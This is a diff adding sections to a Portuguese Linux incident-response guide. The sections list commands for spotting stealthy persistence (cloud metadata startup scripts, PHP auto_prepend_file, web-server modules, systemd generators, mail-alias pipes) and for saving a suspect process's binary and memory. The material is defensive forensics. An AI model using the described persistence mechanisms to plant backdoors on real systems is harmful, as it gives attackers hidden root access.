@@ -1717,6 +2023,50 @@ sudo sshd -T 2>/dev/null | grep -iE 'authorizedkeysfile|authorizedkeyscommand'
 ```
 
 > `AuthorizedKeysCommand` faz o sshd **executar um programa** para obter as chaves aceitas. O `authorized_keys` da §7.5 fica limpo, a auditoria de chave não acusa nada, e a porta continua aberta. Se estiver definido, leia o script apontado como se fosse malware (§5).
+
+## Startup-script no metadata da cloud (fora do filesystem)
+
+Persistência que **não está em disco nenhum**: quem tem credencial de cloud (§10.5) define o script de inicialização da instância, e ele roda como root a **cada boot** — inclusive depois de você trocar o disco.
+
+```bash
+# GCP — o que a instância vai executar no próximo boot
+curl -s -H 'Metadata-Flavor: Google' \
+  'http://169.254.169.254/computeMetadata/v1/instance/attributes/startup-script'
+# AWS
+curl -s http://169.254.169.254/latest/user-data
+# quem executa isso
+systemctl status google-startup-scripts cloud-init amazon-ssm-agent 2>/dev/null
+```
+
+> **Nenhum comando das §7.1–§7.11 encontra isto** — não há arquivo, cron nem unit. A alteração aparece no audit da cloud (§10.4) e a prevenção é a §34.10. Se a credencial da instância vazou (§10.5), confira isto **antes** de declarar o host limpo — e depois do rebuild também (§27).
+
+## Módulo e hook do servidor web (webshell sem arquivo de webshell)
+
+```bash
+grep -rn 'auto_prepend_file\|auto_append_file' /etc/php* 2>/dev/null
+sudo find /var/www /srv -name '.htaccess' -newerct "$D" 2>/dev/null
+sudo nginx -T 2>/dev/null | grep -i load_module
+ls -la /etc/apache2/mods-enabled 2>/dev/null; apachectl -M 2>/dev/null | tail -20
+```
+
+> `auto_prepend_file` faz o PHP executar um arquivo **antes de cada requisição**, em qualquer rota. O docroot fica limpo, o grep de webshell da §16 não acha nada, e o backdoor roda em 100% dos acessos. Um módulo carregado no nginx/apache tem o mesmo efeito, um nível abaixo.
+
+## Generators do systemd
+
+```bash
+sudo ls -la /etc/systemd/system-generators /usr/lib/systemd/system-generators 2>/dev/null
+```
+
+> Executável ali roda **como root a cada boot**, antes de qualquer unit — e não aparece em `systemctl list-units`.
+
+## `.forward` e aliases de e-mail
+
+```bash
+sudo find /home /root -name '.forward' -o -name '.procmailrc' 2>/dev/null
+sudo grep -n '|' /etc/aliases 2>/dev/null
+```
+
+> Uma linha `|"/caminho/comando"` faz o MTA executar aquilo a cada e-mail recebido. Legado, mas continua funcionando onde há MTA local.
 
 ## Contas na camada de dados (sobrevivem ao rebuild)
 
@@ -3335,9 +3685,12 @@ sudo nft list ruleset \
 
 # 29. Coleta rápida de um PID
 
+> **Por quê:** o mesmo material da §4, mas **salvo em arquivo** — para quando o processo pode morrer, ser morto (§20) ou o host reiniciar. Colete agora, leia depois. **Olhe para:** rodar isto **antes** de qualquer ação que altere o processo.
+
 ```bash
 PID=<PID>
 
+{
 sudo ps -o \
 pid,ppid,user,group,lstart,etime,stat,args \
 -p "$PID"
@@ -3363,7 +3716,16 @@ sudo ls -la /proc/$PID/fd
 sudo lsof -Pan -p "$PID"
 
 sudo lsof -Pan -a -p "$PID" -i
+} 2>&1 | sudo tee "$IR/pid-$PID.txt"
 ```
+
+```bash
+# e o que não é texto: o binário e a memória, enquanto o processo existe (§6)
+sudo cp /proc/$PID/exe "$IR/samples/pid-$PID.bin"     # vale mesmo se o arquivo foi apagado (§3.14)
+sudo gcore -o "$IR/samples/pid-$PID.core" "$PID"      # config e C2 do binário packed (§5.5)
+```
+
+> A ordem importa: `/proc/<pid>/exe` e o core **deixam de existir** no instante em que o processo morre. Se você vai matar (§20), estes dois comandos vêm antes.
 
 ---
 
